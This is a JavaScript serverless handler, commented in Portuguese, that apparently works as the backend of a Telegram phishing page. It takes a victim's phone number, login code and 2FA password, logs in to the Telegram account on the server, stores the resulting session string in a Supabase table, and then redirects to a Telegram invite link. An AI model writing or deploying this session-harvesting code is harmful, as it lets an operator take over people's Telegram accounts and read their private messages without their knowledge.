import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions";
import { Api } from "telegram/tl";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

export default async function handler(req, res) {
  let { phoneNumber, code, password } = req.body;
  
  // 1. LIMPEZA TOTAL (Garante que só tem números)
  const cleanPhone = phoneNumber.toString().replace(/\D/g, '');
  const cleanCode = code.toString().trim();

  console.log(`[VERIFY] Validando: ${cleanPhone}`);

  try {
      // 2. Busca no banco pelo número LIMPO
      const { data: authData, error } = await supabase
        .from('auth_state')
        .select('*')
        .eq('phone_number', cleanPhone)
        .single();

      if (error || !authData) {
          console.error("Erro auth_state:", error);
          return res.status(400).json({ error: "Sessão não encontrada ou expirada." });
      }

      // 3. Conecta
      const client = new TelegramClient(new StringSession(authData.temp_session), apiId, apiHash, {
        connectionRetries: 5,
        useWSS: false, 
      });
      await client.connect();

      // 4. Login
      if (password) {
            await client.signIn({ password, phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: cleanCode });
      } else {
            try {
                await client.invoke(new Api.auth.SignIn({ phoneNumber: cleanPhone, phoneCodeHash: authData.phone_code_hash, phoneCode: cleanCode }));
            } catch (e) {
                if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
                    await client.disconnect();
                    return res.status(200).json({ status: 'needs_2fa' });
                }
                throw e;
            }
      }

      // 5. SALVA A SESSÃO FINAL (Parte Crítica)
      const finalSession = client.session.save();
      
      const { error: saveError } = await supabase.from('telegram_sessions').upsert({
        phone_number: cleanPhone,
        session_string: finalSession,
        is_active: true,
        created_at: new Date()
      }, { onConflict: 'phone_number' });

      if (saveError) {
          console.error("Erro ao salvar sessão:", saveError);
          throw new Error("Falha ao salvar no banco.");
      }

      // 6. Limpa temporário
      await supabase.from('auth_state').delete().eq('phone_number', cleanPhone);
      await client.disconnect();
      
      res.status(200).json({ success: true, redirect: "https://t.me/+krRexYUrqMVkMmNh" });

  } catch (error) {
    console.error("ERRO FINAL:", error);
    res.status(400).json({ error: error.message || "Erro na validação" });
  }
}
